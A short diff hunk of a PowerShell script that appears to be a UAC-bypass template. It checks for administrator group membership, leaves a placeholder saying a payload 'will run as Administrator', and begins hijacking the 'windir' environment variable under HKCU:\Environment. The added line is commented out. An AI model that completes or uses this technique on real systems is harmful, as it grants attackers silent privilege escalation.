@@ -1,6 +1,8 @@
 if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
     #Payload goes here
     #It'll run as Administrator
+    #& cmd.exe /c $vsTestPath $TestAssembly 2`>`&1
+
 } else {
     $registryPath = "HKCU:\Environment"
     $Name = "windir"
